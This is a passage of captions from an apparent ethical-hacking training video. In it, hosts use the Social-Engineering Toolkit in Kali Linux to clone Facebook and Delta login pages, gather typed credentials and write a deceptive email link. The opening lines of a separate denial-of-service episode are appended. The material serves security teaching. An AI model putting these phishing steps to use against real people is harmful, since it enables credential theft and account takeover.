site.\n\n493\n00:21:18.560 --> 00:21:22.970\nBut Facebook is now being mirrored\nto the Kali Linux machine, and\n\n494\n00:21:22.970 --> 00:21:26.140\nwe're actually running the front end of\nFacebook, not the whole thing of course.\n\n495\n00:21:26.140 --> 00:21:29.350\nBut we're running the front end of it,\nthe sign in page\n\n496\n00:21:29.350 --> 00:21:33.230\non the Kali Linux box through social\nengineering toolkit to be able to then\n\n497\n00:21:33.230 --> 00:21:36.470\nscrape user credentials as people log in,\n>> Wow.\n\n498\n00:21:36.470 --> 00:21:38.206\n>> And gather those usernames and\npasswords.\n\n499\n00:21:38.206 --> 00:21:41.760\n[COUGH] And so what we have Is\nthe ability to log in here.\n\n500\n00:21:41.760 --> 00:21:43.810\nIf I go and log in and\nprovide a user name and\n\n501\n00:21:43.810 --> 00:21:46.410\na password, that's actually\ngonna show up on the back end.\n\n502\n00:21:46.410 --> 00:21:48.570\n>> Wow.\n>> And we're gonna actually have that, and\n\n503\n00:21:48.570 --> 00:21:50.850\nwe're actually gonna be able to use that.\n\n504\n00:21:50.850 --> 00:21:53.830\nThis is when we often talk about,\nhey, can we screen scrape?\n\n505\n00:21:53.830 --> 00:21:55.570\nHey, can we get the username and password?\n\n506\n00:21:55.570 --> 00:21:57.310\nI keep saying It's not that hard to do.\n\n507\n00:21:57.310 --> 00:21:58.930\nHow hard would it be to guess it?\n\n508\n00:21:58.930 --> 00:22:00.260\nhow hard would it be to get it?\n\n509\n00:22:00.260 --> 00:22:02.650\nWe're actually gonna show\nyou how easy it may well be.\n\n510\n00:22:02.650 --> 00:22:04.830\nSo what we're gonna do\nis walk backwards now.\n\n511\n00:22:04.830 --> 00:22:07.498\nGo back to Mike's machine,\ngo look at Kali Linux, and\n\n512\n00:22:07.498 --> 00:22:11.340\nwe're gonna actually show you how we\ndid this, cuz this is kinda cool.\n\n513\n00:22:11.340 --> 00:22:14.685\nSo the Kali box,\ncan we zoom in maybe a little bit?\n\n514\n00:22:14.685 --> 00:22:16.963\nSo what we're gonna do is the following.\n\n515\n00:22:16.963 --> 00:22:19.282\nWe're gonna actually, let's kill Cali and\n\n516\n00:22:19.282 --> 00:22:21.610\nlet's actually just\nstart it back up again.\n\n517\n00:22:21.610 --> 00:22:23.890\nAnd I'm gonna walk you from\nthe beginning how to do that.\n\n518\n00:22:23.890 --> 00:22:26.910\nSo we're gonna go to the app browser.\n\n519\n00:22:26.910 --> 00:22:29.126\nRight, so you may have to scroll down\njust a little to the bottom there.\n\n520\n00:22:29.126 --> 00:22:30.144\n>> Scroll down a little bit.\n\n521\n00:22:30.144 --> 00:22:31.890\n>> Right that little tic tac toe board.\n\n522\n00:22:31.890 --> 00:22:33.140\nAnd then up top, we're gonna go, and\n\n523\n00:22:33.140 --> 00:22:37.380\nwe're going to type in up at\nthe top there's a search window.\n\n524\n00:22:37.380 --> 00:22:39.950\nType in security engineer.\n\n525\n00:22:39.950 --> 00:22:43.109\nBy the time you get to security,\nit'll should slow you right there.\n\n526\n00:22:43.109 --> 00:22:43.980\nThat's it, right.\n\n527\n00:22:43.980 --> 00:22:46.871\nSo we're gonna launch that tool,\nthat security engineering tool kit.\n\n528\n00:22:46.871 --> 00:22:48.250\nWe're gonna give that a minute.\n\n529\n00:22:48.250 --> 00:22:48.875\nNow zoom in.\n\n530\n00:22:48.875 --> 00:22:51.739\nI wanna show everybody out\nthere something really quick.\n\n531\n00:22:51.739 --> 00:22:54.880\nSo zoom if we can on that\nbefore you hit any keys.\n\n532\n00:22:54.880 --> 00:22:57.722\nSo when you load this,\nwhat's gonna happen with Kali,\n\n533\n00:22:57.722 --> 00:23:01.410\nwith the security engineering tool kit,\nis it's gonna tell you, hey,\n\n534\n00:23:01.410 --> 00:23:05.540\nKali is detecting that you're not running\nsomething called the bleeding edge.\n\n535\n00:23:06.840 --> 00:23:09.880\nI mean you're not downloading\nthe latest exploits and updates.\n\n536\n00:23:09.880 --> 00:23:15.030\nAnd so it says, hey, you're gonna run\nSCT if we install and run it module.\n\n537\n00:23:15.030 --> 00:23:17.345\nYou're gonna run it but\nthe SC tool kit's gonna be out of date.\n\n538\n00:23:17.345 --> 00:23:19.170\nIt's not got the most up to date stuff.\n\n539\n00:23:19.170 --> 00:23:23.520\nDo you want to essentially load bleeding\nedge and download the latest exploits?\n\n540\n00:23:23.520 --> 00:23:24.450\nWe're not gonna do that.\n\n541\n00:23:24.450 --> 00:23:27.390\nWe're just gonna run it the way it is, cuz\nthis exploit is already in the tool kit.\n\n542\n00:23:27.390 --> 00:23:28.485\nSo we're just gonna hit Enter.\n\n543\n00:23:28.485 --> 00:23:29.660\nWe're not gonna worry about that.\n\n544\n00:23:29.660 --> 00:23:30.690\nThat's fine.\n\n545\n00:23:30.690 --> 00:23:32.260\nYeah and just give it a second.\n\n546\n00:23:32.260 --> 00:23:33.520\nAll right, so\nthen it's gonna load the toolkit.\n\n547\n00:23:33.520 --> 00:23:36.310\nSo then you're just gonna scroll down\na little bit just cuz we have to get down\n\n548\n00:23:36.310 --> 00:23:40.730\nto the or maybe zoom out and\nthen center the window or something.\n\n549\n00:23:40.730 --> 00:23:41.890\nRight, just so they can see the prompt.\n\n550\n00:23:41.890 --> 00:23:42.407\nThat's all.\nI just wanna\n\n551\n00:23:42.407 --> 00:23:43.032\nmake sure they can see see it.\n\n552\n00:23:43.032 --> 00:23:43.653\n>> There we go.\n\n553\n00:23:43.653 --> 00:23:47.615\n>> Yeah just a little cuz we weren't\nseeing the actual prompt at the bottom.\n\n554\n00:23:47.615 --> 00:23:51.745\nAnd so what we're going to do there is,\nthis is a menu-driven system, right?\n\n555\n00:23:51.745 --> 00:23:54.011\nSo the menu there is the numbers, right?\n\n556\n00:23:54.011 --> 00:23:56.927\nYou can see on the screen we've\ngot Select from the menu.\n\n557\n00:23:56.927 --> 00:24:00.182\nSocial-Engineering Attacks is number one.\n\n558\n00:24:00.182 --> 00:24:05.230\nThere's a fast track pen testing,\nthere's third party modules.\n\n559\n00:24:05.230 --> 00:24:07.300\nUpdate the meta framework.\n\n560\n00:24:07.300 --> 00:24:08.890\nUpdate the social engineering toolkit.\n\n561\n00:24:08.890 --> 00:24:11.780\nThere's all this engineering\ndifferent stuff in there, right?\n\n562\n00:24:11.780 --> 00:24:13.755\nAnd so,\nwhat we're going to do is do number one.\n\n563\n00:24:13.755 --> 00:24:16.967\nOne, which is going to be the social\nengineering tool kit, attacks,\n\n564\n00:24:16.967 --> 00:24:18.415\nwe're going to load that.\n\n565\n00:24:18.415 --> 00:24:20.815\nSo we're going to type number 1 and\nhit enter, which we did right.\n\n566\n00:24:20.815 --> 00:24:22.265\n>> Yup.\n>> And then the next thing we're\n\n567\n00:24:22.265 --> 00:24:25.863\ngoing to see is we're going to see that\nwe have a list of different attacks,\n\n568\n00:24:25.863 --> 00:24:30.180\nspear-phishing is there,\nwebsite attack vectors is there.\n\n569\n00:24:30.180 --> 00:24:35.180\nWe're going to have PowerShell attack\nvectors, we're going to have QR\n\n570\n00:24:35.180 --> 00:24:38.010\ncode generator attack vectors so\nwe can generate QR codes.\n\n571\n00:24:38.010 --> 00:24:39.440\n>> Nice. [LAUGH] >> We're\ngoing to have somebody scan.\n\n572\n00:24:39.440 --> 00:24:41.040\nThis is a wicked tool.\n\n573\n00:24:41.040 --> 00:24:43.110\n>> We love to scan those too.\n\n574\n00:24:43.110 --> 00:24:44.030\n>> Yeah, just all the time.\n\n575\n00:24:44.030 --> 00:24:45.700\nYou can do all sorts of stuff.\n\n576\n00:24:45.700 --> 00:24:47.250\nSo there's a lot of really cool stuff.\n\n577\n00:24:47.250 --> 00:24:48.930\nSMS spoofing attacks.\n\n578\n00:24:48.930 --> 00:24:52.010\nSo we can move text generators,\nall sorts of stuff.\n\n579\n00:24:52.010 --> 00:24:54.610\nWe're going to do number two,\nwhich is website attack factors.\n\n580\n00:24:54.610 --> 00:24:55.740\nSo number two, hit enter.\n\n581\n00:24:57.070 --> 00:24:58.750\nThen what we're going to do here.\n\n582\n00:24:58.750 --> 00:25:03.000\nAgain, we have a menu,\nwe're not typing a lot of code.\n\n583\n00:25:03.000 --> 00:25:06.910\nWhen we're in the metasploid framework,\nwe're typing in a whole bunch of to code.\n\n584\n00:25:06.910 --> 00:25:07.590\n>> What we're doing.\n\n585\n00:25:07.590 --> 00:25:08.370\nRecon n g.\n\n586\n00:25:08.370 --> 00:25:10.470\nWe're typing in a whole bunch of code.\n\n587\n00:25:10.470 --> 00:25:13.220\nNot that I mind doing that,\nbut as I've told you before.\n\n588\n00:25:13.220 --> 00:25:14.316\nI'm not the best typer.\n\n589\n00:25:14.316 --> 00:25:14.880\n[LAUGH] Right?\n[LAUGH]\n\n590\n00:25:14.880 --> 00:25:15.570\n>> And quite honestly,\n\n591\n00:25:15.570 --> 00:25:16.780\nI make a lot of mistakes.\n\n592\n00:25:16.780 --> 00:25:19.620\nYou see it sometimes [LAUGH] when we do\nthe live demos because I said whoops,\n\n593\n00:25:19.620 --> 00:25:20.680\nI didn't type that the right way.\n\n594\n00:25:20.680 --> 00:25:21.950\nI've got to go back and retype it.\n\n595\n00:25:21.950 --> 00:25:24.174\nAnd see, I've spent a lot of\ntime fixing my own mistakes.\n\n596\n00:25:24.174 --> 00:25:25.610\n>> [LAUGH]\n>> I'm my own worst enemy.\n\n597\n00:25:25.610 --> 00:25:27.880\nI like this because it's a lot\neasier to type a number and\n\n598\n00:25:27.880 --> 00:25:29.610\nnot get into a lot of trouble.\n\n599\n00:25:29.610 --> 00:25:36.150\nNow we've got all these like Java Applet\nattacks, Metasploit browser, exploits.\n\n600\n00:25:36.150 --> 00:25:39.220\nWe've got tabnabbing, webjacking,\n\n601\n00:25:39.220 --> 00:25:42.890\nall this stuff that may be there depending\non the version of the tool you're running.\n\n602\n00:25:42.890 --> 00:25:45.320\nWe're going to do the credential\nharvester attack,\n\n603\n00:25:45.320 --> 00:25:46.960\nwhich will be number three, I believe.\n\n604\n00:25:46.960 --> 00:25:48.490\nSo we're going to do that one.\n\n605\n00:25:48.490 --> 00:25:53.170\nSo now what we're going to do is\nwe've got the options there for\n\n606\n00:25:53.170 --> 00:25:55.520\nweb templates, for site cloner.\n\n607\n00:25:55.520 --> 00:25:57.490\nYou can see where I'm going with this,\nright?\n\n608\n00:25:57.490 --> 00:25:59.690\nOr custom import,\nwe're going to do number two for\n\n609\n00:25:59.690 --> 00:26:04.660\nsite cloner, because site cloner allows us\nto be able to go out and clone the site.\n\n610\n00:26:04.660 --> 00:26:10.160\nNow we have to type in the IP address of\nthe machine that we're going to ultimately\n\n611\n00:26:10.160 --> 00:26:13.710\ngoing to want the post back to happen-\n>> [INAUDIBLE]\n\n612\n00:26:13.710 --> 00:26:17.210\n>> Who's going to host the website, right?\n\n613\n00:26:17.210 --> 00:26:20.350\nWe have to put in the IP\naddress of the machine.\n\n614\n00:26:20.350 --> 00:26:24.734\nIn this case, we're going to put in\nthe IP address of the Cali machine, so\n\n615\n00:26:24.734 --> 00:26:27.750\nthat's going to be 10.1.230.227.\n\n616\n00:26:27.750 --> 00:26:31.090\nThis would obviously be in your world,\nwhatever machine you want to run this on.\n\n617\n00:26:31.090 --> 00:26:33.780\nRight, just whatever machine\nyou're going to have this set on.\n\n618\n00:26:33.780 --> 00:26:36.160\nAll right, so we're going to hit enter,\nthat's going to put that there.\n\n619\n00:26:36.160 --> 00:26:39.210\nAnd then it says enter the URL\nthat we want to clone.\n\n620\n00:26:39.210 --> 00:26:41.930\n>> So\nwe have to put in the URL of the site.\n\n621\n00:26:41.930 --> 00:26:43.560\nSo we could do, you know I did.\n\n622\n00:26:43.560 --> 00:26:45.120\nNo, you don't have to do http.\n\n623\n00:26:45.120 --> 00:26:45.970\n>> Okay.\n>> Just www.\n\n624\n00:26:45.970 --> 00:26:49.760\nSo I did, we did Facebook.com,\nbut we could do anything.\n\n625\n00:26:49.760 --> 00:26:52.870\nWe've already seen Facebook, so\nwhy don't we do a different one?\n\n626\n00:26:52.870 --> 00:26:58.930\nWhy don't you do, give me half a second\nto see if we can do this one here.\n\n627\n00:26:58.930 --> 00:27:02.280\nSo I don't want to make the URL up,\nI want to make sure it's the right one.\n\n628\n00:27:02.280 --> 00:27:07.076\nRight?\n[NOISE]\n\n629\n00:27:07.076

that.\n\n632\n00:27:17.710 --> 00:27:19.720\nHit Enter.\n\n633\n00:27:19.720 --> 00:27:20.430\n>> Okay, right.\n\n634\n00:27:20.430 --> 00:27:22.940\n>> And now just stop there for\na second, right?\n\n635\n00:27:22.940 --> 00:27:26.070\nSo you're going to see there that\nit gives us some information.\n\n636\n00:27:26.070 --> 00:27:27.880\nLet's zoom in a little bit so\nwe can see what's there.\n\n637\n00:27:27.880 --> 00:27:29.940\nI just want people to see what we did,\nokay?\n\n638\n00:27:29.940 --> 00:27:31.370\nSo you'll see we hit enter, right?\n\n639\n00:27:31.370 --> 00:27:32.850\nMy kid, the clone.\n\n640\n00:27:32.850 --> 00:27:34.600\n>> Or rather typed in the url and\nhit enter.\n\n641\n00:27:34.600 --> 00:27:35.860\nCloning the website, right?\n\n642\n00:27:35.860 --> 00:27:37.830\nThis could take a little bit, no problem.\n\n643\n00:27:37.830 --> 00:27:39.230\nSo go down, right?\n\n644\n00:27:39.230 --> 00:27:43.220\nAnd then it says apache is set on,\nso the website's already set up or\n\n645\n00:27:43.220 --> 00:27:44.840\nthe web server's set up to run.\n\n646\n00:27:44.840 --> 00:27:46.500\n>> Tells us where it's going\nto put all that stuff.\n\n647\n00:27:46.500 --> 00:27:48.430\nSo it knows what directory we put it into.\n\n648\n00:27:48.430 --> 00:27:52.300\nIt tells us there are files have\nbeen copies to varwww.html.\n\n649\n00:27:52.300 --> 00:27:53.830\nPress return to continue.\n\n650\n00:27:53.830 --> 00:27:54.440\nRight?\n\n651\n00:27:54.440 --> 00:27:58.370\nAnd so then we're going to\ndo is just press Enter.\n\n652\n00:27:58.370 --> 00:27:59.430\nOkay.\nAnd just stop.\n\n653\n00:27:59.430 --> 00:28:01.130\n>> Okay.\n>> You don't have to do anything else.\n\n654\n00:28:01.130 --> 00:28:02.080\nSo now, right?\n\n655\n00:28:02.080 --> 00:28:07.210\nWe've essentially set that up and so\nwhat we should be able to do, right?\n\n656\n00:28:07.210 --> 00:28:08.290\nIs the following.\n\n657\n00:28:08.290 --> 00:28:09.525\nCome back over to my machine.\n\n658\n00:28:09.525 --> 00:28:13.990\n>> [LAUGH]\n>> Okay, so when we got\n\n659\n00:28:13.990 --> 00:28:18.700\nback over to my machine what we're gonna\ndo is, what do you see up there right now?\n\n660\n00:28:18.700 --> 00:28:19.840\n>> Wow, not you have the Delta site.\n\n661\n00:28:19.840 --> 00:28:21.580\n>> Now I have the Delta site up and\n\n662\n00:28:21.580 --> 00:28:26.940\nyou can see that, I know it may be hard\nto see, I don't know if we could zoom in.\n\n663\n00:28:26.940 --> 00:28:30.180\n>> But if you save my IP address,\nsave my IP address,\n\n664\n00:28:30.180 --> 00:28:35.140\nall I did was hit Refresh and\nit took us to the Delta site, right?\n\n665\n00:28:35.140 --> 00:28:37.080\nAnd so now, I'm sitting at the Delta site.\n\n666\n00:28:37.080 --> 00:28:41.890\nAnd so, if I was to log in at that site,\nI would then be able to\n\n667\n00:28:41.890 --> 00:28:45.320\nGet the credentials or at least I\nwould see the credentials right?\n\n668\n00:28:45.320 --> 00:28:48.950\nAnd that's the problem, right,\nI mean that's the issue.\n\n669\n00:28:48.950 --> 00:28:51.770\n>> And it's not like you were\ntrying to fake the Delta page and\n\n670\n00:28:51.770 --> 00:28:53.320\nmake it look like the Delta page.\n\n671\n00:28:53.320 --> 00:28:54.180\n>> It is the Delta page.\n\n672\n00:28:54.180 --> 00:28:57.300\n>> That is the Delta page with\nthe latest sale they have going on.\n\n673\n00:28:57.300 --> 00:28:59.320\n>> It is.\n>> Or advertisement or like this is.\n\n674\n00:28:59.320 --> 00:29:00.850\n>> It is.\nWe stand with Orlando,\n\n675\n00:29:00.850 --> 00:29:02.010\nwhich is a recent incident.\n\n676\n00:29:02.010 --> 00:29:04.440\n>> Absolutely, it's from today,\nwhen we're shooting.\n\n677\n00:29:04.440 --> 00:29:06.700\nNow here's the cool thing,\nstay on my machine.\n\n678\n00:29:06.700 --> 00:29:10.020\nIt's easy when I say, okay let me\ngo put the URL up because, haha,\n\n679\n00:29:10.020 --> 00:29:11.020\nI know it's there.\n\n680\n00:29:11.020 --> 00:29:12.860\nBut how do we trick\npeople into doing this?\n\n681\n00:29:12.860 --> 00:29:14.710\nThis is a social engineering portion.\n\n682\n00:29:14.710 --> 00:29:15.890\nSo what do we do?\n\n683\n00:29:15.890 --> 00:29:18.140\nSo let me show you, so what I do, right?\n\n684\n00:29:18.140 --> 00:29:22.110\nIs I go in and I write a fake email.\n\n685\n00:29:22.110 --> 00:29:24.760\nNow I'm not doing this in the email\nclient, I'm just doing it in Word so\n\n686\n00:29:24.760 --> 00:29:29.020\nyou can see that this is gonna\nresolve to something, right?\n\n687\n00:29:29.020 --> 00:29:33.810\nAnd so, I write a little email, something\nlike, hey, can we please go ahead and\n\n688\n00:29:33.810 --> 00:29:36.120\nhave everybody go ahead and\n\n689\n00:29:36.120 --> 00:29:40.250\nclick on this particular link to submit\ntheir information for the company trip?\n\n690\n00:29:40.250 --> 00:29:41.330\nOr something, right?\n\n691\n00:29:41.330 --> 00:29:44.030\nAnd so, I just wrote a generic script for\nthe Facebook one, but\n\n692\n00:29:44.030 --> 00:29:46.940\nsince we're changing and we're going to do\nDelta, let's put something else in there.\n\n693\n00:29:46.940 --> 00:29:50.000\nSo this is the said email that\nI would use to launch an attack\n\n694\n00:29:50.000 --> 00:29:53.040\nagainst an unsuspecting victim, so\nthey would click on something like this.\n\n695\n00:29:53.040 --> 00:29:56.110\nNow it says to see my Facebook\npictures click here, and\n\n696\n00:29:56.110 --> 00:30:01.720\nI know that it's hard to see, let me just\nmake this really, really big, right.\n\n697\n00:30:01.720 --> 00:30:06.230\nAnd so when I hover over that,\nwhat does it actually resolved to?\n\n698\n00:30:06.230 --> 00:30:07.330\nRight?\nIt's still really small.\n\n699\n00:30:07.330 --> 00:30:07.880\n>> Yeah.\n\n700\n00:30:07.880 --> 00:30:12.110\n>> But it says basically click,\nright, and it resolves to the IP.\n\n701\n00:30:12.110 --> 00:30:12.820\n>> That 10.1 one.\n\n702\n00:30:12.820 --> 00:30:16.380\n>> It doesn't resolve to Facebook,\nbut people may not know that.\n\n703\n00:30:16.380 --> 00:30:20.680\nAnd people don't bother to look, and what\nhappens is when you go in here and you\n\n704\n00:30:20.680 --> 00:30:25.590\nedit hyperlink, I put in the information\nI want them to see and I put in the URL.\n\n705\n00:30:25.590 --> 00:30:26.410\n>> Right.\n\n706\n00:30:26.410 --> 00:30:28.320\n>> So that's how I trick people so\n\n707\n00:30:28.320 --> 00:30:33.090\nthis will be something like instead of\nto see my Facebook pictures to you know,\n\n708\n00:30:33.090 --> 00:30:38.190\nsee my reserve your seat for the--\n>> Or to see my travel, or\n\n709\n00:30:38.190 --> 00:30:43.850\nyeah, to something like to\nclick on this to reserve\n\n710\n00:30:43.850 --> 00:30:49.140\nyour ticket for trip.\n\n711\n00:30:49.140 --> 00:30:53.600\nYou know you will come up with something,\nwhatever that is, you will click okay, and\n\n712\n00:30:53.600 --> 00:30:56.130\nthe then when you go there you do that.\n\n713\n00:30:56.130 --> 00:30:58.920\nLet me close the website.\n\n714\n00:30:58.920 --> 00:31:03.400\nWhen you go on and do that,\nsomebody gets that on mail, boom.\n\n715\n00:31:03.400 --> 00:31:04.420\nIt comes up.\n\n716\n00:31:04.420 --> 00:31:05.270\n>> And there you go.\n\n717\n00:31:05.270 --> 00:31:08.160\nNow here's the other interesting thing,\nright?\n\n718\n00:31:08.160 --> 00:31:11.770\n>> That loads in,\nthis is Windows 10, by the way.\n\n719\n00:31:11.770 --> 00:31:13.235\nThat loads in the Edge browser.\n\n720\n00:31:13.235 --> 00:31:15.250\n>> [LAUGH]\n>> Default browser in Windows 10.\n\n721\n00:31:15.250 --> 00:31:17.290\nI'm not using IE.\n\n722\n00:31:17.290 --> 00:31:19.640\nI'm using the new version,\nWindows 10 Web, or\n\n723\n00:31:19.640 --> 00:31:23.950\nexcuse me, Windows 10 Edge browser, which\nis supposed to be more secured, right?\n\n724\n00:31:23.950 --> 00:31:29.430\nAnd not load all the potential plugins and\nall the things that get you in trouble.\n\n725\n00:31:29.430 --> 00:31:32.650\nBut even the Edge doesn't understand-\n>> Right.\n\n726\n00:31:32.650 --> 00:31:36.060\n>> That this is a problem and\ndoesn't prevent that from happening.\n\n727\n00:31:36.060 --> 00:31:36.660\nAll right?\n\n728\n00:31:36.660 --> 00:31:37.440\n>> That's amazing.\n\n729\n00:31:37.440 --> 00:31:38.180\n>> So, that's pretty cool.\n\n730\n00:31:38.180 --> 00:31:42.190\n>> And so, easy to do, and\nobviously that's a private IP address, so\n\n731\n00:31:42.190 --> 00:31:44.560\nit would have to be somebody\ninternally that I sent that link to,\n\n732\n00:31:44.560 --> 00:31:46.680\nbut I could just as easily-\n>> Well, we could do it outside.\n\n733\n00:31:46.680 --> 00:31:48.050\n>> Post it on a web server.\n\n734\n00:31:48.050 --> 00:31:49.857\n>> Right.\nYeah, we could set that up.\n\n735\n00:31:49.857 --> 00:31:53.000\n>> And I could send that to anyone in\nthe world, they could click on it,\n\n736\n00:31:53.000 --> 00:31:53.894\ncome to this page.\n\n737\n00:31:53.894 --> 00:31:55.762\nAnd obviously we don't have\nDelta's entire site, but\n\n738\n00:31:55.762 --> 00:31:57.163\nthey're gonna submit the credentials.\n\n739\n00:31:57.163 --> 00:31:59.030\nAnd that's really all I need.\n\n740\n00:31:59.030 --> 00:32:03.180\nOnce I gather those credentials up,\nI can go to Delta now and log in as them.\n\n741\n00:32:03.180 --> 00:32:04.260\nThat's it.\nWe're done.\n\n742\n00:32:04.260 --> 00:32:08.868\n>> Yeah, and as a matter of fact,\nif I do that real quick,\n\n743\n00:32:08.868 --> 00:32:17.380\nlet's just do, Right?\n\n744\n00:32:17.380 --> 00:32:23.235\nSo you'll see it takes me back,\nsorry didn't log in whatever, right?\n\n745\n00:32:23.235 --> 00:32:26.095\nSo it doesn't show the entire site,\nit just doesn't log on.\n\n746\n00:32:26.095 --> 00:32:27.495\nPeople get that all the time,\nthey go, well,\n\n747\n00:32:27.495 --> 00:32:30.365\nyeah, probably I did something,\nmaybe it was me, right?\n\n748\n00:32:30.365 --> 00:32:33.585\n>> Yeah, people are gonna close\nthe browser, type in delta.com, and\n\n749\n00:32:33.585 --> 00:32:36.065\ngo, now it's working, and\nnot think twice about it.\n\n750\n00:32:36.065 --> 00:32:36.620\n>> Right.\n\n751\n00:32:36.620 --> 00:32:38.430\nRight, so now essentially,\nwe've gotten that.\n\n752\n00:32:38.430 --> 00:32:39.700\nSo go back to Kali Linux for me.\n\n753\n00:32:39.700 --> 00:32:40.440\nI know you have it up.\n\n754\n00:32:40.440 --> 00:32:42.460\nCan we go back to Mike's machine for\na second?\n\n755\n00:32:42.460 --> 00:32:43.800\nLet's just see if we can make this work?\n\n756\n00:32:43.800 --> 00:32:45.568\n>> Okay.\n>> So go ahead and type in.\n\n757\n00:32:45.568 --> 00:32:50.274\n[CROSSTALK] Let me just\nthink about where we're at.\n\n758\n00:32:50.274 --> 00:32:58.370\nNo, just type in, Just let me think about\nwhere we are because I'm not doing this.\n\n759\n00:32:58.370 --> 00:32:59.080\nI'm having you do it so\n\n760\n00:32:59.080 --> 00:33:02.380\nI'm trying to keep this straight\nin my mind as to where we are.\n\n761\n00:33:02.380 --> 00:33:04.600\nWhat do we have going on on the screen?\n\n762\n00:33:04.600 --> 00:33:06.620\nWe're there now,\nwe're at the main menu, right?\n\n763\n00:33:06.620 --> 00:33:07.490\n>> We're now at the methods.\n\n764\n00:33:07.490 --> 00:33:08.790\nI can jump back out to the main menu.\n\n765\n00:33:08.790 --> 00:33:11.020\nSo 99 to get back out.\n\n766\n00:33:11.020 --> 00:33:14.760\nAnd now back out of the main menu.\n\n767\n00:33:14.760 --> 00:33:19.372\nSo things like spear fishing, actually,\nI can go back out even further.\n\n768\n00:33:19.372 --> 00:33:21.180\nThere we go.\n\n769\n00:33:21.180 --> 00:33:23.700\n>> We should, actually we should\nhave gotten the, we should have\n\n770\n00:33:23.700 --> 00:33:27.260\nactually seen it come up on the screen,\nit would have fetched it for us.\n\n771\n00:33:27.260 --> 00:33:31.090\nAll right, well don't worry about that,\nwe can go and with it running,\n\n772\n00:33:31.090 --> 00:33:33.690\nit actually pops up on the screen and\nfetches them for you automatically.\n\n773\n00:33:33.690 --> 00:33:37.670\nI was just trying to remember where we\nwere, but essentially what will happen is\n\n774\n00:33:37.670 --> 00:33:40.740\nit will pop up the user names,\nwe can pull that out into a report.\n\n775\n00:33:40.740 --> 00:33:43.360\nI was just going to show you the report.\n\n776\n00:33:43.360 --> 00:33:44.370\nWe could go in and\n\n777\n00:33:44.370 --> 00:33:47.760\ncopy those and then just throw them\nout to a report if we wanted to.\n\n778\n00:33:47.760 --> 00:33:50.500\nThe passwords are sitting\nthere in the system.\n\n779\n00:33:50.500 --> 00:33:52.090\nWe just have to go in and\nfetch them essentially.\n\n780\n00:33:52.090 --> 00:33:55.720\nThe fetch command is actually running and\npulls those usernames and passwords out.\n\n781\n00:33:55.720 --> 00:33:57.220\n>> Okay.\n>> But it's kinda cool because now we\n\n782\n00:33:57.220 --> 00:33:58.560\nessentially we can get all this passwords.\n\n783\n00:33:58.560 --> 00:33:59.340\n>> Yeah, absolutely.\n\n784\n00:33:59.340 --> 00:34:00.080\n>> Have everything going.\n\n785\n00:34:00.080 --> 00:34:03.500\nSo that's what we would do with\nthe social engineering tool kit\n\n786\n00:34:03.500 --> 00:34:04.640\nto be able to bring that up.\n\n787\n00:34:04.640 --> 00:34:08.790\nAnd you'll mirror that site in real time\nand actually show you what that would be.\n\n788\n00:34:08.790 --> 00:34:11.380\nOr how we could use it to do\ncredential harvesting essentially,\n\n789\n00:34:11.380 --> 00:34:15.230\nso a real world example,\nif you will, of social engineering.\n\n790\n00:34:15.230 --> 00:34:20.620\nAnd remember, you may really have no way\nof understanding that that's a spoof site,\n\n791\n00:34:20.620 --> 00:34:24.300\nbecause if we do resolve it,\nas Mike pointed out to an outside IP.\n\n792\n00:34:24.300 --> 00:34:27.440\nNot something clearly internal,\nand clearly private.\n\n793\n00:34:27.440 --> 00:34:31.670\nBut if we do that on an external facing\nwebsite that has a legitimate IP.\n\n794\n00:34:31.670 --> 00:34:33.460\nPeople don't know what\nthe real IP is at Delta.\n\n795\n00:34:33.460 --> 00:34:35.885\nHow many people do a reverse\nping to figure that out.\n\n796\n00:34:35.885 --> 00:34:37.020\n>> Mm-hm.\n>> And see what the IP really is.\n\n797\n00:34:37.020 --> 00:34:39.160\nThey just click on a link and\nassume, yeah, that's good.\n\n798\n00:34:39.160 --> 00:34:40.390\nThat's where it's supposed to go.\n\n799\n00:34:40.390 --> 00:34:44.610\nAnd this is why phishing is so successful\nand why phishing can be so insidious.\n\n800\n00:34:44.610 --> 00:34:47.390\nBecause the problem is that\nessentially people click on the link\n\n801\n00:34:47.390 --> 00:34:49.370\nthinking it should resolve, and it does.\n\n802\n00:34:49.370 --> 00:34:51.770\nBut then they have something like\nthat happen where they type it in,\n\n803\n00:34:51.770 --> 00:34:55.475\nnothing works, and they chalk it up\nto just something going wrong, but\n\n804\n00:34:55.475 --> 00:34:58.485\nwe've already gotten that information and\nthen we can use it.\n\n805\n00:34:58.485 --> 00:34:58.995\nRight?\n\n806\n00:34:58.995 --> 00:35:00.285\n>> Absolutely.\n\n807\n00:35:00.285 --> 00:35:02.265\n>> Just think about that,\nand understand that.\n\n808\n00:35:02.265 --> 00:35:04.215\nBut yeah,\nthat's what we do with social engineering.\n\n809\n00:35:04.215 --> 00:35:04.975\n>> All right, Adam.\n\n810\n00:35:04.975 --> 00:35:07.255\nAgain, a great look there\nat social engineering.\n\n811\n00:35:07.255 --> 00:35:10.700\nReally scary stuff when it\ncomes down to it because it's\n\n812\n00:35:10.700 --> 00:35:14.260\npretty darn easy to take\nadvantage of that human weakness.\n\n813\n00:35:14.260 --> 00:35:19.690\nAnd the patching is not there, it's\na little difficult to patch our end user.\n\n814\n00:35:19.690 --> 00:35:23.120\nGood example of that, hope everybody\nout there enjoyed watching this one.\n\n815\n00:35:23.120 --> 00:35:25.730\nSigning off for ITPRO.TV,\nI'm Mike Roderick.\n\n816\n00:35:25.730 --> 00:35:26.620\n>> I'm Adam Gordon.\n\n817\n00:35:26.620 --> 00:35:28.969\n>> And we'll see you next time.\n\n818\n00:35:28.969 --> 00:35:36.336\n[SOUND]\n\n",

00:00:15.381\nI'm your host Mike Roderick.\n\n4\n00:00:16.970 --> 00:00:19.944\nAnd today we're doing our certified,\nethical hacker version nine.\n\n5\n00:00:19.944 --> 00:00:24.680\nAnd specifically in this episode, we're\ngonna be looking at denial of service, and\n\n6\n00:00:24.680 --> 00:00:27.730\nhere to help explain that concept is Mr.\nAdam Gordon.\n\n7\n00:00:27.730 --> 00:00:28.550\nHow you doing Adam?\n\n8\n00:00:28.550 --> 00:00:29.250\n&gt;&gt; I'm doing well.\n\n9\n00:00:29.250 --> 00:00:31.020\nI'm doing well, thank you for asking.\n\n10\n00:00:31.020 --> 00:00:34.400\nSo, we can talk about denial\nof service many ways, and\n\n11\n00:00:34.400 --> 00:00:37.590\nwe often start the conversation\nlike this by talking about\n\n12\n00:00:37.590 --> 00:00:41.110\nwhat the conceptual thought process\nis behind denial of service.\n\n13\n00:00:41.110 --> 00:00:42.870\nSo when we think about denial of service,\n\n14\n00:00:42.870 --> 00:00:46.343\nwe think about the ability to\nessentially attack a system, 